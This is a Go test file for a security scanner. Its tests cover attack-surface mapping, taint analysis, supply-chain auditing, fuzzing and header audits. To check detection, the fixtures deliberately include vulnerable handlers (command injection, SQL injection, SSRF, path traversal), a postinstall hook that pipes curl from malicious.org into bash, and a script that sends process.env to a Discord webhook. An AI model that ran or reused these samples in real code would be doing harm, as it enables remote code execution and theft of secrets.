package security

import (
	"context"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
)

func TestScanAttackSurface(t *testing.T) {
	tmpDir := t.TempDir()

	// 1. Go file with endpoints & security flags
	goCode := `package main

import (
	"net/http"
)

func setupRoutes(r *Router) {
	http.HandleFunc("/api/v1/health", HealthHandler)
	r.POST("/admin/restart", RestartHandler)
	r.GET("/public/feed", FeedHandler)
	
	// Insecure CORS header
	w.Header().Set("Access-Control-Allow-Origin", "*")
	
	// Spoofable header check
	clientIP := req.Header.Get("X-Forwarded-For")
	_ = clientIP
}
`
	if err := os.WriteFile(filepath.Join(tmpDir, "server.go"), []byte(goCode), 0644); err != nil {
		t.Fatalf("failed to write server.go: %v", err)
	}

	// 2. JS / TS file
	tsCode := `import express from 'express';
const app = express();

app.get('/api/users', (req, res) => res.json([]));
app.delete('/api/users/:id', (req, res) => res.sendStatus(204));
`
	if err := os.WriteFile(filepath.Join(tmpDir, "api.ts"), []byte(tsCode), 0644); err != nil {
		t.Fatalf("failed to write api.ts: %v", err)
	}

	// 3. Python file
	pyCode := `from flask import Flask, request
app = Flask(__name__)

@app.route("/debug/vars", methods=['GET'])
def debug_vars():
    return {}

@app.post("/system/reboot")
def reboot():
    return "ok"
`
	if err := os.WriteFile(filepath.Join(tmpDir, "app.py"), []byte(pyCode), 0644); err != nil {
		t.Fatalf("failed to write app.py: %v", err)
	}

	// 4. Rust file
	rsCode := `use actix_web::{get, post, web, HttpResponse};

#[get("/metrics")]
async fn metrics() -> HttpResponse {
    HttpResponse::Ok().body("ok")
}

#[post("/internal/eval")]
async fn evaluate() -> HttpResponse {
    HttpResponse::Ok().body("done")
}
`
	if err := os.WriteFile(filepath.Join(tmpDir, "routes.rs"), []byte(rsCode), 0644); err != nil {
		t.Fatalf("failed to write routes.rs: %v", err)
	}

	// Execute Scan
	resultMap, mdReport, err := ScanAttackSurface(tmpDir)
	if err != nil {
		t.Fatalf("ScanAttackSurface failed: %v", err)
	}

	endpointsCount, ok := resultMap["endpoints_count"].(int)
	if !ok || endpointsCount < 6 {
		t.Errorf("expected at least 6 endpoints discovered, got %v", resultMap["endpoints_count"])
	}

	routes, ok := resultMap["routes"].([]RouteInfo)
	if !ok || len(routes) == 0 {
		t.Fatalf("expected non-empty routes slice")
	}

	// Verify sensitive routes were detected
	foundAdmin := false
	foundDebug := false
	for _, r := range routes {
		if strings.Contains(r.Path, "admin") {
			foundAdmin = true
			if !r.IsSensitive {
				t.Errorf("expected /admin/restart to be flagged as sensitive")
			}
		}
		if strings.Contains(r.Path, "debug") {
			foundDebug = true
			if !r.IsSensitive {
				t.Errorf("expected /debug/vars to be flagged as sensitive")
			}
		}
	}

	if !foundAdmin {
		t.Errorf("expected to discover /admin/restart route")
	}
	if !foundDebug {
		t.Errorf("expected to discover /debug/vars route")
	}

	// Verify Security Flags
	secFlags, ok := resultMap["security_flags"].([]SecurityFlag)
	if !ok || len(secFlags) < 2 {
		t.Errorf("expected at least 2 security flags (CORS and spoofable header), got %d", len(secFlags))
	}

	// Verify Markdown output contains tag
	if !strings.Contains(mdReport, "<attack_surface_report>") || !strings.Contains(mdReport, "</attack_surface_report>") {
		t.Errorf("markdown report missing <attack_surface_report> tags")
	}
}

func TestRunTaintAnalysis(t *testing.T) {
	tmpDir := t.TempDir()

	// Vulnerable file with multiple taint categories
	vulnGo := `package handlers

import (
	"database/sql"
	"fmt"
	"net/http"
	"os"
	"os/exec"
)

func VulnerableHandler(w http.ResponseWriter, r *http.Request) {
	// Command Injection
	cmdInput := r.URL.Query().Get("cmd")
	exec.Command("sh", "-c", cmdInput)

	// SQL Injection
	nameInput := r.FormValue("name")
	query := fmt.Sprintf("SELECT * FROM users WHERE name = '%s'", nameInput)
	var db *sql.DB
	db.Query(query)

	// Path Traversal
	filePath := r.URL.Query().Get("file")
	os.ReadFile(filePath)

	// SSRF
	targetURL := r.URL.Query().Get("url")
	http.Get(targetURL)

	// Insecure Credential Comparison
	secret := r.Header.Get("X-API-Key")
	if secret == "master-secret-12345" {
		w.Write([]byte("authorized"))
	}
}

func SanitizedHandler(w http.ResponseWriter, r *http.Request) {
	// Properly sanitized path
	p := r.URL.Query().Get("safe_file")
	cleanPath := filepath.Clean(p)
	os.ReadFile(cleanPath)
}
`
	if err := os.WriteFile(filepath.Join(tmpDir, "vuln.go"), []byte(vulnGo), 0644); err != nil {
		t.Fatalf("failed to write vuln.go: %v", err)
	}

	findings, mdReport, err := RunTaintAnalysis(tmpDir)
	if err != nil {
		t.Fatalf("RunTaintAnalysis failed: %v", err)
	}

	if len(findings) < 4 {
		t.Fatalf("expected at least 4 taint findings, got %d", len(findings))
	}

	categoriesFound := make(map[string]bool)
	for _, f := range findings {
		categoriesFound[f.Category] = true
		if f.ID == "" || f.Severity == "" || f.Remediation == "" {
			t.Errorf("finding %s has incomplete fields: %+v", f.ID, f)
		}
	}

	if !categoriesFound["Command Injection"] {
		t.Errorf("expected Command Injection finding")
	}
	if !categoriesFound["SQL Injection"] {
		t.Errorf("expected SQL Injection finding")
	}
	if !categoriesFound["Path Traversal"] {
		t.Errorf("expected Path Traversal finding")
	}
	if !categoriesFound["SSRF"] {
		t.Errorf("expected SSRF finding")
	}
	if !categoriesFound["Weak Auth / Crypto"] {
		t.Errorf("expected Weak Auth finding")
	}

	if !strings.Contains(mdReport, "<taint_analysis_report>") || !strings.Contains(mdReport, "</taint_analysis_report>") {
		t.Errorf("markdown report missing <taint_analysis_report> tags")
	}
}

func TestAuditSupplyChain(t *testing.T) {
	tmpDir := t.TempDir()

	// 1. Malicious package.json with suspicious postinstall hook
	pkgJSON := `{
  "name": "malicious-sample",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "curl -s http://malicious.org/install.sh | bash",
    "test": "echo test"
  }
}`
	if err := os.WriteFile(filepath.Join(tmpDir, "package.json"), []byte(pkgJSON), 0644); err != nil {
		t.Fatalf("failed to write package.json: %v", err)
	}

	// 2. Suspicious script with Discord webhook exfil & raw IP
	scriptContent := `
function exfiltrate() {
    const rawIP = "http://185.220.101.5:8080/c2";
    const webhook = "https://discord.com/api/webhooks/999999/secret";
    const creds = Buffer.from("dGVzdA==", 'base64');
    fetch(webhook, { method: "POST", body: JSON.stringify(process.env) });
}
`
	if err := os.WriteFile(filepath.Join(tmpDir, "telemetry.js"), []byte(scriptContent), 0644); err != nil {
		t.Fatalf("failed to write telemetry.js: %v", err)
	}

	findings, mdReport, err := AuditSupplyChain(tmpDir)
	if err != nil {
		t.Fatalf("AuditSupplyChain failed: %v", err)
	}

	if len(findings) < 3 {
		t.Fatalf("expected at least 3 supply chain findings, got %d", len(findings))
	}

	foundHook := false
	foundRawIP := false
	foundWebhook := false
	foundBase64 := false

	for _, f := range findings {
		switch f.Kind {
		case "Suspicious Lifecycle Script":
			foundHook = true
		case "Hardcoded Raw IP Communication":
			foundRawIP = true
		case "Potential Webhook Exfiltration":
			foundWebhook = true
		case "Base64 Obfuscation":
			foundBase64 = true
		}
	}

	if !foundHook {
		t.Errorf("expected to detect Suspicious Lifecycle Script in package.json")
	}
	if !foundRawIP {
		t.Errorf("expected to detect raw IP communication")
	}
	if !foundWebhook {
		t.Errorf("expected to detect webhook exfiltration destination")
	}
	if !foundBase64 {
		t.Errorf("expected to detect base64 obfuscation")
	}

	if !strings.Contains(mdReport, "<supply_chain_report>") || !strings.Contains(mdReport, "</supply_chain_report>") {
		t.Errorf("markdown report missing <supply_chain_report> tags")
	}
}

func TestRunSmartFuzz(t *testing.T) {
	var requestCount int64

	// Mock server that tracks concurrent burst and handles fuzzed payloads
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt64(&requestCount, 1)

		// Header bypass test
		if r.Header.Get("X-Admin") == "true" {
			w.WriteHeader(http.StatusOK)
			w.Write([]byte("admin-unlocked"))
			return
		}

		// SQLi detection reflection
		q := r.URL.Query().Get("fuzz")
		if strings.Contains(q, "OR '1'='1'") {
			w.WriteHeader(http.StatusOK)
			w.Write([]byte("sqlite3.OperationalError: syntax error near OR"))
			return
		}

		// Normal response
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("ok"))
	}))
	defer ts.Close()

	ctx := context.Background()
	resultMap, mdReport, err := RunSmartFuzz(ctx, ts.URL, "GET", 15, nil)
	if err != nil {
		t.Fatalf("RunSmartFuzz failed: %v", err)
	}

	concurrencyData, ok := resultMap["concurrency"].(map[string]any)
	if !ok {
		t.Fatalf("expected concurrency map in result")
	}

	workers, _ := concurrencyData["workers"].(int)
	if workers != 15 {
		t.Errorf("expected 15 workers, got %d", workers)
	}

	success2xx, _ := concurrencyData["success_2xx"].(int)
	if success2xx != 15 {
		t.Errorf("expected 15 successful 2xx responses in burst, got %d", success2xx)
	}

	payloadResults, ok := resultMap["payload_results"].([]any)
	if !ok {
		// May be slice of struct
		if prSlice, isSlice := resultMap["payload_results"]; !isSlice || prSlice == nil {
			t.Fatalf("expected payload_results in result map")
		}
	} else if len(payloadResults) == 0 {
		t.Errorf("expected non-empty payload results")
	}

	if !strings.Contains(mdReport, "<smart_fuzz_report>") || !strings.Contains(mdReport, "</smart_fuzz_report>") {
		t.Errorf("markdown report missing <smart_fuzz_report> tags")
	}
}

func TestSecurityDuelReport(t *testing.T) {
	tmpDir := t.TempDir()

	// Write small test file with route and taint
	code := `package main
import (
	"net/http"
	"os/exec"
)

func Handler(w http.ResponseWriter, r *http.Request) {
	cmd := r.URL.Query().Get("c")
	exec.Command("sh", "-c", cmd)
}

func setup() {
	http.HandleFunc("/api/exec", Handler)
}
`
	if err := os.WriteFile(filepath.Join(tmpDir, "main.go"), []byte(code), 0644); err != nil {
		t.Fatalf("failed to write main.go: %v", err)
	}

	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer ts.Close()

	ctx := context.Background()
	duelReport, err := RunSecurityDuel(ctx, tmpDir, ts.URL)
	if err != nil {
		t.Fatalf("RunSecurityDuel failed: %v", err)
	}

	if duelReport.AttackSurfaceCount == 0 {
		t.Errorf("expected discovered attack surface endpoints")
	}
	if len(duelReport.TaintFindings) == 0 {
		t.Errorf("expected taint findings in duel report")
	}
	if len(duelReport.RedTeamExploits) == 0 {
		t.Errorf("expected Red Team exploits to be synthesized")
	}
	if len(duelReport.WhiteTeamPatches) == 0 {
		t.Errorf("expected White Team patches to be synthesized")
	}
	if duelReport.VerifiedFixed == 0 {
		t.Errorf("expected VerifiedFixed count > 0")
	}
	if !strings.Contains(duelReport.SummaryMarkdown, "<security_duel_report>") {
		t.Errorf("summary markdown missing <security_duel_report> tag")
	}
}

func TestOWASPSecureHeadersAudit(t *testing.T) {
	tmpDir := t.TempDir()

	insecureServer := `package main

import "net/http"

func handle(w http.ResponseWriter, r *http.Request) {
	// Leaky header
	w.Header().Set("X-Powered-By", "Express/4.18.2")
	w.Header().Set("Server", "Apache/2.4.41")
	// Insecure CSP
	w.Header().Set("Content-Security-Policy", "default-src 'self' 'unsafe-inline' 'unsafe-eval'")
	w.Write([]byte("ok"))
}

func main() {
	http.HandleFunc("/api/data", handle)
}
`
	if err := os.WriteFile(filepath.Join(tmpDir, "server.go"), []byte(insecureServer), 0644); err != nil {
		t.Fatalf("failed to write server.go: %v", err)
	}

	resultMap, mdReport, err := ScanAttackSurface(tmpDir)
	if err != nil {
		t.Fatalf("ScanAttackSurface failed: %v", err)
	}

	audit, ok := resultMap["owasp_headers_audit"].(map[string]any)
	if !ok {
		t.Fatalf("expected owasp_headers_audit in resultMap")
	}
	if serverDetected, ok := audit["server_detected"].(bool); !ok || !serverDetected {
		t.Errorf("expected server_detected true")
	}
	leaky, ok := audit["leaky_headers"].([]string)
	if !ok || len(leaky) < 2 {
		t.Errorf("expected at least 2 leaky headers detected, got %v", leaky)
	}

	secFlags, ok := resultMap["security_flags"].([]SecurityFlag)
	if !ok {
		t.Fatalf("expected security_flags")
	}
	foundLeaky := false
	foundInsecureCSP := false
	foundMissing := false
	for _, f := range secFlags {
		if f.Kind == "OWASP_HEADER_RISK" {
			if strings.Contains(f.Detail, "X-Powered-By") {
				foundLeaky = true
			}
			if strings.Contains(f.Detail, "unsafe-inline") {
				foundInsecureCSP = true
			}
		}
		if f.Kind == "MISSING_OWASP_SECURITY_HEADERS" {
			foundMissing = true
		}
	}
	if !foundLeaky {
		t.Errorf("expected OWASP_HEADER_RISK for X-Powered-By")
	}
	if !foundInsecureCSP {
		t.Errorf("expected OWASP_HEADER_RISK for insecure CSP")
	}
	if !foundMissing {
		t.Errorf("expected MISSING_OWASP_SECURITY_HEADERS")
	}
	if !strings.Contains(mdReport, "OWASP Secure Headers Audit") {
		t.Errorf("markdown report missing OWASP Secure Headers Audit section")
	}
}

